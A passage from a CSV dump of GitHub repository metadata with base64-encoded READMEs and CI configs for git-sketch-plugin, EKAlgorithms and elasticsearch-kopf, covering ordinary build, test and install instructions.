ZWxsQDIKICAgIGlucHV0czoKICAgICAgZmlsZVBhdGg6IC5ccnVuLXRlc3Rz
LnBzMQogICAgZGlzcGxheU5hbWU6ICdydW4gdGVzdHMnCiAgLSB0YXNrOiBQ
dWJsaXNoVGVzdFJlc3VsdHNAMgogICAgZGlzcGxheU5hbWU6ICdQdWJsaXNo
IFRlc3QgUmVzdWx0cyAqKi8qLnRyeCcKICAgIGNvbmRpdGlvbjogc3VjY2Vl
ZGVkT3JGYWlsZWQoKQogICAgaW5wdXRzOgogICAgICB0ZXN0UmVzdWx0c0Zv
cm1hdDogVlNUZXN0CiAgICAgIHRlc3RSZXN1bHRzRmlsZXM6ICcqKi8qLnRy
eCcgCgotIGpvYjogTGludXhSZWxlYXNlCiAgcG9vbDoKICAgIHZtSW1hZ2U6
ICdVYnVudHUgMTYuMDQnCiAgdmFyaWFibGVzOgogICAgYnVpbGRDb25maWd1
cmF0aW9uOiAnUmVsZWFzZScKICBzdGVwczoKICAtIHRhc2s6IERvdE5ldENv
cmVJbnN0YWxsZXJAMAogICAgaW5wdXRzOgogICAgICBwYWNrYWdlVHlwZTog
J3NkaycKICAgICAgdmVyc2lvbjogJChuZXRDb3JlU2RrVmVyc2lvbikKICAt
IHNjcmlwdDogZG90bmV0IGJ1aWxkIC0tY29uZmlndXJhdGlvbiAkKGJ1aWxk
Q29uZmlndXJhdGlvbikKICAgIGRpc3BsYXlOYW1lOiAnZG90bmV0IGJ1aWxk
ICQoYnVpbGRDb25maWd1cmF0aW9uKScKICAtIHNjcmlwdDogLi9ydW4tdGVz
dHMuc2gKICAgIGRpc3BsYXlOYW1lOiAncnVuIHRlc3RzJyAgICAKICAtIHRh
c2s6IFB1Ymxpc2hUZXN0UmVzdWx0c0AyCiAgICBkaXNwbGF5TmFtZTogJ1B1
Ymxpc2ggVGVzdCBSZXN1bHRzICoqLyoudHJ4JwogICAgY29uZGl0aW9uOiBz
dWNjZWVkZWRPckZhaWxlZCgpCiAgICBpbnB1dHM6CiAgICAgIHRlc3RSZXN1
bHRzRm9ybWF0OiBWU1Rlc3QKICAgICAgdGVzdFJlc3VsdHNGaWxlczogJyoq
LyoudHJ4JyAK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'git-sketch-plugin',50212606,b':gem::octocat: A Git client generating pretty diffs built right into Sketch.',b'JavaScript',47,2400,,2400,False,b'https://api.github.com/repos/mathieudutour/git-sketch-plugin/forks',"IyMgVGhpcyBwbHVnaW4gd2FzIGEgZmlyc3QgYXR0ZW1wdCB0byBicmluZyB2
ZXJzaW9uIGNvbnRyb2wgYW5kIGNvbGxhYm9yYXRpb24gdG8gZGVzaWduZXJz
LiBTaW5jZSB0aGVuLCBTa2V0Y2ggZXZvbHZlZCBhIGxvdCBhbmQgbXkgbmV3
IHByb2plY3QgdGFrZXMgYWR2YW50YWdlcyBvZiB0aGVtIHRvIHVubG9jayBf
dHJ1ZV8gdmVyc2lvbiBjb250cm9sLiBDaGVjayBpdCBvdXQ6IFtodHRwOi8v
a2FjdHVzLmlvXShodHRwOi8va2FjdHVzLmlvKQoKLS0tCgoKPGltZyBhbGln
bj0icmlnaHQiIHNyYz0ibG9nby5wbmciPgoKZ2l0LXNrZXRjaC1wbHVnaW4K
PT09PT09PT09ClshW0dpdEh1YiByZWxlYXNlXShodHRwczovL2ltZy5zaGll
bGRzLmlvL2dpdGh1Yi9yZWxlYXNlL21hdGhpZXVkdXRvdXIvZ2l0LXNrZXRj
aC1wbHVnaW4uc3ZnP21heEFnZT0yNTkyMDAwKV0oaHR0cHM6Ly9naXRodWIu
Y29tL21hdGhpZXVkdXRvdXIvZ2l0LXNrZXRjaC1wbHVnaW4vcmVsZWFzZXMp
IApbIVtHaXRIdWIgcmVsZWFzZV0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9i
YWRnZS9Xb3JrcyUyMHdpdGgtU2tldGNoJTIwUnVubmVyLWJsdWUuc3ZnP2Nv
bG9yQj0zMDhBREYpXShodHRwOi8vYml0Lmx5L1NrZXRjaFJ1bm5lcldlYnNp
dGUpCgogQSBHaXQgY2xpZW50IGJ1aWx0IHJpZ2h0IGludG8gW1NrZXRjaF0o
aHR0cDovL3d3dy5ib2hlbWlhbmNvZGluZy5jb20vc2tldGNoKS4gR2VuZXJh
dGUgW3ByZXR0eSBkaWZmc10oaHR0cHM6Ly9naXRodWIuY29tL21hdGhpZXVk
dXRvdXIvZ2l0LXNrZXRjaC1wbHVnaW4vcHVsbC8xL2ZpbGVzKSBzbyB0aGF0
IGV2ZXJ5Ym9keSBrbm93cyB3aGF0IGFyZSB0aGUgY2hhbmdlcyEKCkZyb20g
Li4uCiFbVWdseV0oZXhhbXBsZS9TY3JlZW5TaG90QmFkLnBuZykKCgouLi4g
VG8KIVtQcmV0dHldKGV4YW1wbGUvU2NyZWVuU2hvdE5pY2UucG5nKQoKIVtz
Y3JlZW4gY2FzdF0oZXhhbXBsZS9TY3JlZW5DYXN0LmdpZikKCiMjIFJlcXVp
cmVtZW50cwoqIFtTa2V0Y2hdKGh0dHA6Ly9za2V0Y2hhcHAuY29tLykgPj0g
My40ICgqKm5vdCoqIHdpdGggdGhlIHNhbmRib3hlZCB2ZXJzaW9uIGllIGZy
b20gdGhlIEFwcCBTdG9yZSkuCiogW0dpdF0oaHR0cHM6Ly9naXQtc2NtLmNv
bS8pIChjb21pbmcgd2l0aCBPUyBYIHNvIHlvdSBzaG91bGRuJ3QgaGF2ZSB0
byBkbyBhbnl0aGluZykKKiBbWGNvZGUgQ29tbWFuZCBMaW5lIFRvb2xzXSho
dHRwOi8vb3N4ZGFpbHkuY29tLzIwMTQvMDIvMTIvaW5zdGFsbC1jb21tYW5k
LWxpbmUtdG9vbHMtbWFjLW9zLXgvKQoKIyMgSW5zdGFsbGF0aW9uCgojIyMg
RnJvbSBhIHJlbGVhc2UgKHNpbXBsZXN0KQoKKiBbRG93bmxvYWRdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9tYXRoaWV1ZHV0b3VyL2dpdC1za2V0Y2gtcGx1Z2lu
L3JlbGVhc2VzL2xhdGVzdCkgdGhlIGxhdGVzdCByZWxlYXNlIG9mIHRoZSBw
bHVnaW4KKiBVbi16aXAKKiBEb3VibGUtY2xpY2sgb24gR2l0LnNrZXRjaHBs
dWdpbgoKIyMjIEZyb20gdGhlIHNvdXJjZXMKCiogQ2xvbmUgdGhlIHJlcG8K
KiBJbnN0YWxsIHRoZSBkZXBlbmRlbmNpZXMgKGBucG0gaW5zdGFsbGApCiog
QnVpbGQgKGBucG0gcnVuIGJ1aWxkYCkKKiBEb3VibGUtY2xpY2sgb24gR2l0
LnNrZXRjaHBsdWdpbgoKIyMgRG9jdW1lbnRhdGlvbgpGb3IgYSBHZXR0aW5n
IHN0YXJ0ZWQgZ3VpZGUsIEZBUSwgZXRjLiBjaGVjayBvdXQgb3VyIFtkb2Nz
XShodHRwczovL2dpdGh1Yi5jb20vbWF0aGlldWR1dG91ci9naXQtc2tldGNo
LXBsdWdpbi90cmVlL21hc3Rlci9kb2NzKSEKCiMjIFdhbnQgdG8gY29udHJp
YnV0ZT8KCkFueW9uZSBjYW4gaGVscCBtYWtlIHRoaXMgcHJvamVjdCBiZXR0
ZXIgLSBjaGVjayBvdXQgb3VyIFtDb250cmlidXRpbmcgZ3VpZGVdKC9DT05U
UklCVVRJTkcubWQpIQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'EKAlgorithms',12034693,b'EKAlgorithms contains some well known CS algorithms & data structures.',b'Objective-C',6,2399,,2399,False,b'https://api.github.com/repos/EvgenyKarkan/EKAlgorithms/forks',"WyFbQnVpbGQgU3RhdHVzXShodHRwczovL3RyYXZpcy1jaS5vcmcvRXZnZW55
S2Fya2FuL0VLQWxnb3JpdGhtcy5zdmcpXShodHRwczovL3RyYXZpcy1jaS5v
cmcvRXZnZW55S2Fya2FuL0VLQWxnb3JpdGhtcykKCkVLQWxnb3JpdGhtcwo9
PT09PT09PT09PT0KCkVLQWxnb3JpdGhtcyBpcyBhIHNldCBvZiBjb21wdXRl
ciBleGVyY2lzZXMgaW1wbGVtZW50ZWQgaW4gT2JqZWN0aXZlLUMuIApEYXRh
IHN0cnVjdHVyZXMsIHdlbGwga25vd24gYWxnb3JpdGhtcywgQ1MgY3VyaW9z
aXRpZXMsIHlvdSBuYW1lIGl0IQoKRG9uJ3QgZm9yZ2V0IHRvICp3YXRjaCog
dGhlIHJlcG9zaXRvcnk7IEl0cyBjb250ZW50IHdpbGwgYmUgZXhwYW5kZWQg
YW5kIHVwZGF0ZWQgZnJlcXVlbnRseS4KCkFycmF5cyBhbmQgTGlzdHMKLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQogCjEuIEluZGV4IG9mIG1heGltdW0gZWxl
bWVudCBpbiBhcnJheS4KMi4gSW5kZXhlcyBvZiBtYXhpbXVtIGFuZCBtaW5p
bXVtIGVsZW1lbnRzIHNpbXVsdGFuZW91c2x5LgozLiBGaW5kIGxvbmdlc3Qg
c3RyaW5nIGluIGFycmF5IG9mIHN0cmluZ3MuIAo0LiBGaW5kIHNob3J0ZXN0
IHN0cmluZyBpbiBhcnJheSBvZiBzdHJpbmdzLgo1LiBBcnJheSByZXZlcnNl
Lgo2LiBJbnRlcnNlY3Rpb24gb2YgdHdvIGFycmF5cy4KNy4gVW5pb24gb2Yg
dHdvIGFycmF5cyAod2l0aCByZW1vdmUgZHVwbGljYXRlcykuCjguIFVuaW9u
IG9mIHR3byBhcnJheXMgKHdpdGggcmVtb3ZlIGR1cGxpY2F0ZXMpIGZvciBz
b21lIGtleS4KOS4gRmluZCBkdXBsaWNhdGVzLgoxMC4gQXJyYXkgd2l0aCBO
IHVuaXF1ZS9ub3QgdW5pcXVlIHJhbmRvbSBvYmplY3RzLgoxMS4gQ2hlY2sg
aWYgYXJyYXkgaXMgc29ydGVkLgoxMi4gQXJyYXkgc2h1ZmZsZSAoRmlzaGVy
LVlhdGVzKS4KMTMuIFN1bSBvZiBhcnJheSBlbGVtZW50cy4KMTQuIE4gb2Yg
b2NjdXJlbmNlcyBvZiBlYWNoIGVsZW1lbnQgaW4gYXJyYXkuCgpTZWFyY2gg
QWxnb3JpdGhtcwotLS0tLS0tLS0tLS0tLS0tLQoxLiBMaW5lYXIgc2VhcmNo
LgoyLiBCaW5hcnkgc2VhcmNoLgoKU29ydGluZyBBbGdvcml0aG1zCi0tLS0t
LS0tLS0tLS0tLS0tLQoxLiBCdWJibGUgc29ydC4KMi4gU2hlbGwgc29ydC4K
My4gTWVyZ2Ugc29ydC4gIAo0LiBRdWljayBzb3J0LiAgCjUuIEluc2VydGlv
biBzb3J0Lgo2LiBTZWxlY3Rpb24gc29ydC4KNy4gUmFkaXggU29ydC4KOC4g
UGFydGlhbCBzZWxlY3Rpb24gc29ydC4KOS4gSGVhcCBzb3J0LgoKU2VsZWN0
aW9uIEFsZ29yaXRobXMKLS0tLS0tLS0tLS0tLS0tLS0tLS0KMS4gUXVpY2tz
ZWxlY3QuCgpTdHJpbmdzCi0tLS0tLS0KMS4gUGFsaW5kcm9tZSBvciBub3Qu
CjIuIFN0cmluZyByZXZlcnNlLgozLiBXb3JkcyBjb3VudC4KNC4gUGVybXV0
YXRpb25zIG9mIHN0cmluZy4gCjUuIE9jY3VycmVuY2VzIG9mIGVhY2ggY2hh
cmFjdGVyIChhIC0geikuCjYuIENvdW50ICJuZWVkbGVzIiBpbiBhICJoYXlz
dGFjayIuCjcuIFJhbmRvbSBzdHJpbmcuCjguIENvbmNhdGVuYXRpb24gb2Yg
dHdvIHN0cmluZ3MuCjkuIEZpbmQgMXN0IG9jY3VycmVuY2Ugb2YgIm5lZWRs
ZSIgaW4gYSAiaGF5c3RhY2siLgoxMC4gTGFzdCBvY2N1cnJlbmNlIG9mICJu
ZWVkbGUiIGluIGEgImhheXN0YWNrIi4KMTEuIExvbmdlc3QgY29tbW9uIHN1
YnNlcXVlbmNlLgoxMi4gTGV2ZW5zaHRlaW4gZGlzdGFuY2UuCjEzLiBLTVAg
KEtudXRo4oCTTW9ycmlz4oCTUHJhdHQpLgoxNC4gQm95ZXLigJNNb29yZSBz
dHJpbmcgc2VhcmNoIGFsZ29yaXRobS4KCk51bWVyaWMgQWxnb3JpdGhtcwot
LS0tLS0tLS0tLS0tLS0tLS0KMS4gU2lldmUgb2YgRXJhdG9zdGhlbmVzLgoy
LiBHcmVhdCBjb21tb24gZGl2aXNvciAoR0NEKS4KMy4gTGVhc3QgY29tbW9u
IG11bHRpcGxlIChMQ00pLgo0LiBGYWN0b3JpYWwuCjUuIEZpYm9uYWNjaSBu
dW1iZXJzICg1IGFsZ29zKS4KNi4gU3VtIG9mIGRpZ2l0cy4KNy4gQmluYXJ5
IHRvIGRlY2ltYWwgY29udmVyc2lvbi4KOC4gRGVjaW1hbCB0byBiaW5hcnkg
Y29udmVyc2lvbi4KOS4gRmFzdCBleHBvbmVudGlhdGlvbi4KMTAuIE51bWJl
ciByZXZlcnNlLgoxMS4gRXZlbi9vZGQgY2hlY2suCjEyLiBMZWFwIHllYXIg
Y2hlY2suCjEzLiBBcm1zdHJvbmcgbnVtYmVyIGNoZWNrLgoxNC4gUHJpbWUg
bnVtYmVyIGNoZWNrLgoxNS4gRmluZCBOdGggcHJpbWUuCjE2LiBTd2FwIHRo
ZSB2YWx1ZSBvZiB0d28gTlNJbnRlZ2VyIHBvaW50ZXJzLgoxNy4gU3F1YXJl
IHJvb3QgdXNpbmcgTmV3dG9uLVJhcGhzb24gbWV0aG9kLgoxOC4gQ29udmVy
dCBpbnRlZ2VyIHRvIGFub3RoZXIgbnVtZXJhbCBzeXN0ZW0gKDIsIDgsIDEy
LCAxNikuICAKMTkuIEZhc3QgaW52ZXJzZSBzcXVhcmUgcm9vdC4KCkRhdGEg
U3RydWN0dXJlcwotLS0tLS0tLS0tLS0tLS0KMS4gU3RhY2sgKExJRk8pLgoy
LiBRdWV1ZSAoRklGTykuCjMuIERlcXVlLgo0LiBMaW5rZWQgbGlzdC4KNS4g
R3JhcGg6IAogICAgLSBERlMgKGRlcHRoLWZpcnN0IHNlYXJjaCk7CiAgICAt
IEJGUyAoYnJlYWR0aC1maXJzdCBzZWFyY2gpOwogICAgLSBNU1QgKG1pbmlt
dW0gc3Bhbm5pbmcgdHJlZSAtIFByaW0ncyBhbGdvcml0aG0pOwogICAgLSBN
U1QgKG1pbmltdW0gc3Bhbm5pbmcgdHJlZSAtIEtydXNrYWwncyBhbGdvcml0
aG0pOwogICAgLSBTaG9ydGVzdCBwYXRoIChEaWprc3RyYSdzIGFsZ29yaXRo
bSk7CiAgICAtIFRvcHNvcnQuCjYuIFRyZWUuICAKNy4gQmluYXJ5IHRyZWU6
ICAKICAgIC0gUHJlLW9yZGVyIHRyYXZlcnNhbDsKICAgIC0gSW4tb3JkZXIg
dHJhdmVyc2FsOwogICAgLSBQb3N0LW9yZGVyIHRyYXZlcnNhbC4KOC4gQmlu
YXJ5IHNlYXJjaCB0cmVlIChCU1QpLiAgCjkuIEFWTCB0cmVlLgoxMC4gQmlu
YXJ5IGhlYXAuCgpQcm9ibGVtcwotLS0tLS0tLQoxLiBKb3NlcGh1cyBQcm9i
bGVtLgoyLiBNb2R1bG8gYmlhcy4KCkdlb21ldHJ5Ci0tLS0tLS0tCjEuIEFy
cmF5IG9mIHNvcnRlZCBsb2NhdGlvbnMgYWNjb3JkaW5nIHRvIGEgZGlzdGFu
Y2UgdG8gYSBnaXZlbiBsb2NhdGlvbi4gIAoyLiBDYXJ0ZXNpYW4gcXVhZHJh
bnQgc2VsZWN0aW9uIGFsZ29yaXRobXMKClJlY3Vyc2lvbiAgCi0tLS0tLS0t
LQoxLiBUb3dlciBvZiBIYW5vaS4KCkNvbnRyaWJ1dGlvbnMKLS0tLS0tLS0t
LS0tLSAgIApQdWxsIHJlcXVlc3RzIGFyZSB3ZWxjb21lISBCdXQgaWYgeW91
IHdhbnQgdG8gZG8gYSBjb250cmlidXRpb24sIG9wZW4gYW4gaXNzdWUgZmly
c3QuCgpPcmlnaW5hbGx5LCB0aGUgY29tcGlsZWQgZXhlcmNpc2VzIGFyZSBm
b3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMgb25seSBhbmQgaGF2ZSBubyBpbnRl
bnRpb24gb2YgYmVpbmcgdGhlIHVsdGltYXRlIHNvbHV0aW9uIGNvbXBsZXhp
dHktd2lzZSwgYnV0IHRoZXkgZG8gaW50ZW5kIHRvIGJlIHVzZWQgYnkgeW91
IGFzIGEgc3RhcnRpbmcgcG9pbnQgb2YgYSBkZWVwZXIgc3R1ZHkgb24gYWxn
b3JpdGhtcyBhbmQgdGhlaXIgb3B0aW1pemF0aW9uLiAKCkltcG9ydGFudCBO
b3RlCi0tLS0tLS0tLS0tLS0tClRoZSBGb3VuZGF0aW9uIGZyYW1ld29yayBh
bHJlYWR5IGluY2x1ZGVzIHRvb2xzIGFuZCBtZXRob2RzIGZvciBtb3N0IG9m
IHRoZSBleGVyY2lzZXMgY29udGFpbmVkIGhlcmUuIEt1ZG9zIHRvIEFwcGxl
IG9uIHRoYXQhCkJ1dC4uLiB0aGlzLiBpcy4gU1BBUlRBIQpTbyBsZXRzIGdl
dCBvdXIgaGFuZHMgZGlydHkgYW5kIHRyeSB0byBpbXBsZW1lbnQgY29vbCBD
UyBzdHVmZiB3aXRoIG1pbmltYWwgdXNlIG9mIGV4aXN0aW5nIEFQSXMuCgpU
aGFua3MhCgpTaW1pbGFyIHJlcG9zaXRvcmllcwotLS0tLS0tLS0tLS0tLS0t
LS0tLQoKKiBbYWxnb3JpdGhtc10oaHR0cHM6Ly9naXRodWIuY29tL3NhZ2l2
by9hbGdvcml0aG1zKQoKPiBhbGdvcml0aG1zIHBsYXlncm91bmQgZm9yIGNv
bW1vbiBxdWVzdGlvbnMgKFJ1YnkgbGFuZ3VhZ2UpCgoqIFtTd2lmdFN0cnVj
dHVyZXNdKGh0dHBzOi8vZ2l0aHViLmNvbS93YXluZXdiaXNob3AvU3dpZnRT
dHJ1Y3R1cmVzKQoKPiBFeGFtcGxlcyBvZiBjb21tb25seSB1c2VkIGRhdGEg
c3RydWN0dXJlcyBhbmQgYWxnb3JpdGhtcyBpbiBTd2lmdC4gKFN3aWZ0KQoK
KiBbc3dpZnQtYWxnb3JpdGhtLWNsdWJdKGh0dHBzOi8vZ2l0aHViLmNvbS9o
b2xsYW5jZS9zd2lmdC1hbGdvcml0aG0tY2x1YikKCj4gQWxnb3JpdGhtcyBh
bmQgZGF0YSBzdHJ1Y3R1cmVzIGluIFN3aWZ0LCB3aXRoIGV4cGxhbmF0aW9u
cyEKCkNvbnRyaWJ1dG9ycwotLS0tLS0tLS0tLS0KU3BlY2lhbCB0aGFua3Mg
dG8gdGhlc2UgZ3V5cyBmb3IgdGhlaXIgY29udHJpYnV0aW9ucyB0byB0aGUg
cHJvamVjdCdzIGRldmVsb3BtZW50OgotIFtAc3RhbmlzbGF3XShodHRwczov
L2dpdGh1Yi5jb20vc3RhbmlzbGF3KQotIFtAdml0dG9yaW9tIF0oaHR0cHM6
Ly9naXRodWIuY29tL3ZpdHRvcmlvbSkKLSBbQEF1c3RpbkNob3VdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9BdXN0aW5DaG91KQoK
",,"bGFuZ3VhZ2U6IG9iamVjdGl2ZS1jCm9zeF9pbWFnZTogeGNvZGU3LjMKCmJl
Zm9yZV9pbnN0YWxsOgotIHN3X3ZlcnMKLSBjZCBFS0FsZ29yaXRobXNBcHAK
Cmluc3RhbGw6IG1ha2UgaW5zdGFsbAoKc2NyaXB0OiBtYWtlIGNpCgoK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'elasticsearch-kopf',12163044,b'web admin interface for elasticsearch',b'JavaScript',42,2398,,2398,False,b'https://api.github.com/repos/lmenezes/elasticsearch-kopf/forks',"a29wZgo9PT09PT09PT09PT09PT09PT09PT09PQoKa29wZiBpcyBhIHNpbXBs
ZSB3ZWIgYWRtaW5pc3RyYXRpb24gdG9vbCBmb3IgW2VsYXN0aWNzZWFyY2hd
KGh0dHA6Ly9lbGFzdGljLmNvKSB3cml0dGVuIGluIEphdmFTY3JpcHQgKyBB
bmd1bGFySlMgKyBqUXVlcnkgKyBUd2l0dGVyIGJvb3RzdHJhcC4KCkl0IG9m
ZmVycyBhbiBlYXN5IHdheSBvZiBwZXJmb3JtaW5nIGNvbW1vbiB0YXNrcyBv
biBhbiBlbGFzdGljc2VhcmNoIGNsdXN0ZXIuIE5vdCBldmVyeSBzaW5nbGUg
QVBJIGlzIGNvdmVyZWQgYnkgdGhpcyBwbHVnaW4sIGJ1dCBpdCBkb2VzIG9m
ZmVyIGEgUkVTVCBjbGllbnQgd2hpY2ggYWxsb3dzIHlvdSB0byBleHBsb3Jl
IHRoZSBmdWxsIHBvdGVudGlhbCBvZiB0aGUgRWxhc3RpY1NlYXJjaCBBUEku
CgojIyBJbXBvcnRhbnQ6CgpLb3BmIGlzIG5vIGxvbmdlciBtYWludGFpbmVk
LiBBIHJlcGxhY2VtZW50KGNlcmVicm8pIGhhcyBiZWVuIGRldmVsb3BlZCBh
bmQgaXMgY3VycmVudGx5IG1haW50YWluZWQgYXQgW2h0dHBzOi8vZ2l0aHVi
LmNvbS9sbWVuZXplcy9jZXJlYnJvXShodHRwczovL2dpdGh1Yi5jb20vbG1l
bmV6ZXMvY2VyZWJybykuIEF0IHRoaXMgcG9pbnQsIGNlcmVicm8gc2hvdWxk
IGJlIHByZXR0eSBtdWNoIGZlYXR1cmUgZXF1aXZhbGVudCBvZiBrb3BmLCB3
aXRoIGEgZmV3IG5ldyBmZWF0dXJlcyBvbiB0b3AuCgpWZXJzaW9ucwotLS0t
LS0tLS0tLS0KCnwgZWxhc3RpY3NlYXJjaCB2ZXJzaW9uIHwgYnJhbmNoIHwg
bGF0ZXN0IHZlcnNpb24gIHwKfCAtLS0tLS0tLS0tLS0tLS0tLS0tLS0gfCAt
LS0tLS0gfCAtLS0tLS0tLS0tLS0tLS0gfAp8IDAuOTAuWCAgICAgICAgICAg
ICAgICB8IDAuOTAgICB8IHYwLjkwICAgICAgICAgICB8CnwgMS5YICAgICAg
ICAgICAgICAgICAgIHwgMS4wICAgIHwgdjEuNi4xICAgICAgICAgIHwKfCAy
LlggICAgICAgICAgICAgICAgICAgfCAyLjAgICAgfCB2Mi4xLjEgICAgICAg
ICAgfAoKSW5zdGFsbGF0aW9uCi0tLS0tLS0tLS0tLQpZb3UgY2FuIGVpdGhl
ciBpbnN0YWxsIGEgc3BlY2lmaWMgdmVyc2lvbih1c2luZyBpdHMgcmVsZWFz
ZSB0YWcpIG9yIHRoZSBtb3N0IHVwIHRvIGRhdGUgdmVyc2lvbiBmcm9tIGEg
Z2l2ZW4gYnJhbmNoLgoKIyMjI0luc3RhbGxpbmcgb24gYW4gRWxhc3RpY3Nl
YXJjaCBpbnN0YW5jZToKCmBgYGJhc2gKLi9lbGFzdGljc2VhcmNoL2Jpbi9w
bHVnaW4gaW5zdGFsbCBsbWVuZXplcy9lbGFzdGljc2VhcmNoLWtvcGYve2Jy
YW5jaHx2ZXJzaW9ufQpvcGVuIGh0dHA6Ly9sb2NhbGhvc3Q6OTIwMC9fcGx1
Z2luL2tvcGYKYGBgCgojIyMjUnVuIGxvY2FsbHk6CgpgYGBiYXNoCmdpdCBj
bG9uZSBnaXQ6Ly9naXRodWIuY29tL2xtZW5lemVzL2VsYXN0aWNzZWFyY2gt
a29wZi5naXQKY2QgZWxhc3RpY3NlYXJjaC1rb3BmCmdpdCBjaGVja291dCB7
YnJhbmNofHZlcnNpb259Cm9wZW4gX3NpdGUvaW5kZXguaHRtbApgYGAKCnBz
OiBsb2NhbCBleGVjdXRpb24gZG9lc24ndCB3b3JrIHdpdGggQ2hyb21lKGFu
ZCBtYXliZSBvdGhlciBicm93c2VycykuIFNlZSBtb3JlIFtoZXJlXShodHRw
Oi8vZG9jcy5hbmd1bGFyanMub3JnL2FwaS9uZy5kaXJlY3RpdmU6bmdJbmNs
dWRlKS4KCkFsdGVybmF0aXZlbHkgeW91IGNhbiBydW4gaXQgdmlhIGBjb25u
ZWN0YCB3aGljaCBzaG91bGQgc29sdmUgdGhlIGBuZy1pbmNsdWRlYCBpc3N1
ZS4KCmBgYGJhc2gKZ2l0IGNsb25lIGdpdDovL2dpdGh1Yi5jb20vbG1lbmV6
ZXMvZWxhc3RpY3NlYXJjaC1rb3BmLmdpdApjZCBlbGFzdGljc2VhcmNoLWtv
cGYKZ2l0IGNoZWNrb3V0IHticmFuY2h8dmVyc2lvbn0KbnBtIGluc3RhbGwK
Z3J1bnQgc2VydmVyCmBgYAoKQnJvd3NlIHRvIDxodHRwOi8vbG9jYWxob3N0
OjkwMDAvX3NpdGU+LgoKIyMjI0tvcGYgYmVoaW5kIGEgcmV2ZXJzZSBwcm94
eQpFeGFtcGxlIGNvbmZpZ3VyYXRpb24gZm9yIG5naW54OgpgYGAKc2VydmVy
IHsKICBsaXN0ZW4gICAgICAgODA4MDsKICBzZXJ2ZXJfbmFtZSAgbG9jYWxo
b3N0OwoKICBsb2NhdGlvbiB+IF4vZXMuKiQgewogICAgcHJveHlfcGFzcyBo
dHRwOi8vbG9jYWxob3N0OjkyMDA7CiAgICByZXdyaXRlIF4vZXMoLiopIC8k
MSBicmVhazsKICB9CgogIGxvY2F0aW9uIH4gXi9rb3BmLy4qJCB7CiAgICBw
cm94eV9wYXNzIGh0dHA6Ly9sb2NhbGhvc3Q6OTIwMDsKICAgIHJld3JpdGUg
Xi9rb3BmLyguKikgL19wbHVnaW4va29wZi8kMSBicmVhazsKICB9Cn0KYGBg
CkV4YW1wbGUgY29uZmlndXJhdGlvbiBmb3Iga29wZihrb3BmX2V4dGVybmFs
X3NldHRpbmdzLmpzb24pOgpgYGBqc29uCnsKICAiZWxhc3RpY3NlYXJjaF9y
b290X3BhdGgiOiAiL2VzIiwKICAid2l0aF9jcmVkZW50aWFscyI6IGZhbHNl
LAogICJ0aGVtZSI6ICJkYXJrIiwKICAicmVmcmVzaF9yYXRlIjogNTAwMAp9
CmBgYApBY2Nlc3Mga29wZiBhdCBodHRwOi8vbG9jYWxob3N0OjgwODAva29w
Zi8KIyMjI1RyeSBpdCBvbmxpbmU6CmBgYApodHRwOi8vbG1lbmV6ZXMuY29t
L2VsYXN0aWNzZWFyY2gta29wZi8/bG9jYXRpb249aHR0cDovL2xvY2FsaG9z
dDo5MjAwCmBgYAoKIyMjI0Jhc2ljIEhUVFAgQXV0aCBzdXBwb3J0OgpgYGAK
aHR0cDovL2xtZW5lemVzLmNvbS9lbGFzdGljc2VhcmNoLWtvcGYvP2xvY2F0
aW9uPWh0dHA6Ly91c2VyOnB3ZEBsb2NhbGhvc3Q6OTIwMApgYGAKCmlmIHVz
aW5nIGh0dHBzOi8vZ2l0aHViLmNvbS9Bc3F1ZXJhL2VsYXN0aWNzZWFyY2gt
aHR0cC1iYXNpYywgdHJ5OgpgYGAKaHR0cDovL2xtZW5lemVzLmNvbS9lbGFz
dGljc2VhcmNoLWtvcGYvP2xvY2F0aW9uPWh0dHA6Ly91c2VyOnB3ZEBsb2Nh
bGhvc3Q6OTIwMC8vCmBgYApUaGUgcGx1Z2luIG1vZGlmaWVzIHRoZSBiYXNl
IGVsYXN0aWNzZWFyY2ggcmVzcG9uc2UgYW5kIHRoZXJlZm9yZSB0aGlzIHdv
cmthcm91bmQgaXMgbmVlZGVkLgoKU2NyZWVuc2hvdHMKLS0tLS0tLS0tLS0t
CiMjIyNjbHVzdGVyIG92ZXJ2aWV3CiFbY2x1c3RlciBvdmVydmlld10oaW1n
cy9jbHVzdGVyX3ZpZXcucG5nKQoKIyMjI2hlYWRlciByZWZsZWN0cyBjbHVz
dGVyIHN0YXRlCiFbY2x1c3RlciBzdGF0ZV0oaW1ncy9jbHVzdGVyX3N0YXRl
LnBuZykKCiMjIyNSRVNUIENsaWVudAohW3Jlc3QgY2xpZW50XShpbWdzL3Jl
c3RfY2xpZW50LnBuZykKCiMjIyNhbGlhc2VzIG1hbmFnZW1lbnQKIVthbGlh
c2VzIG1hbmFnZW1lbnRdKGltZ3MvYWxpYXNlcy5wbmcpCgojIyMjd2FybWVy
cyBtYW5hZ2VtZW50CiFbd2FybWVycyBtYW5hZ2VtZW50XShpbWdzL3dhcm1l
ci5wbmcpCgojIyMjcGVyY29sYXRvcgohW3BlcmNvbGF0b3JdKGltZ3MvcGVy
Y29sYXRvci5wbmcpCgojIyMjc25hcHNob3RzIG1hbmFnZW1lbnQKIVtzbmFw
c2hvdHMgbWFuYWdlbWVudF0oaW1ncy9zbmFwc2hvdC5wbmcpCgojIyMjYW5h
bHlzaXMgYXBpCiFbYW5hbHlzaXMgYXBpXShpbWdzL2FuYWx5c2lzLnBuZykK
